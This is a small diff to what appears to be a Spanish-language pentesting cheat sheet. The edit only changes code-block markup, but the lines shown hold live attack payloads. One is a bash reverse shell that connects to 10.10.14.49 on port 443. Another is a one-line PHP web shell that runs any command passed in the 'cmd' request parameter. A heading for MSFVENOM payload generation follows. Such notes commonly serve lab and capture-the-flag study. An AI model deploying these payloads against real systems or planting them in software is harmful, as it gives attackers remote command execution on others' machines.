@@ -20,9 +20,9 @@ bash -c "bash -i >& /dev/tcp/10.10.14.49/443 0>&1"
 
 Ejecución de comandos
 
-<code>
+~~~
   <?php system($_REQUEST["cmd"]); ?>
-</code>
+~~~
 
 ## MSFVENOM
 
